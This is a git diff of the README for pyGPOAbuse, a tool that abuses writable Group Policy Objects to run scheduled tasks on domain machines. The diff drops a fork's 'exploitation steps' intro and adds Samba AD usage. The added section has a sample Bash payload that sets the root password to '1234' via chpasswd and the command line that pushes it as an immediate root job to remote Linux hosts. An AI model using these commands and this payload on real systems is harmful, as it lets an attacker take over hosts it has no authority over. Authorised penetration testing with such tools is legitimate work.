@@ -1,17 +1,4 @@
-# pyGPOAbuse_samba_ad_dc fork
-
-this fork contains support for samba ad dc for creating tasks behalf of privileged gpo.  
-
-exploitation steps:  
-1- create executable file with your needs. it can be bash script or elf binary.  
-2- execute pygpoabuse.py against a samba ad dc.  
-3- after gp update, machine/machines received an instant job to execute the executable.  
-4- see if your executable is worked or not. (multiple issues of "samba-gpupdate" might be needed)  
-
-here's a poc:  
-![poc](https://github.com/crosscutsaw/pyGPOAbuse_samba_ad_dc/raw/master/assets/samba_ad_dc_poc.jpg)
-
-## below is original pygpoabuse repository readme  
+# pyGPOAbuse
 
 ## Description
 
@@ -53,12 +40,28 @@ Delete the scheduled task after it executed.
 ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" --cleanup
 ```
 
+### Samba AD Usage  
+
+This tool also can be used with Samba AD Domains. It will create an **immediate job** as **root** on the remote computer for computer GPO.  
+
+First, create a Bash script or ELF file.  
+
+```
+#!/bin/bash
+echo "root:1234" | chpasswd
+```
+
+Then execute tool with `--linux-exec` argument.  
+
+```
+./pygpoabuse.py DOMAIN/user:password -gpo-id "12345677-ABCD-9876-ABCD-123456789012" --linux-exec /path/to/executable
+```
+
+![Example](https://github.com/user-attachments/assets/173baf0b-e502-4424-bdf6-f97ed0e042af)
 
 ## Credits
 
 * [@pkb1s](https://twitter.com/pkb1s) for [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
 * [@airman604](https://twitter.com/airman604) for [schtask_now.py](https://github.com/airman604/schtask_now)
 * [@SkelSec](https://twitter.com/skelsec) for [msldap](https://github.com/skelsec/msldap)
-
-
 
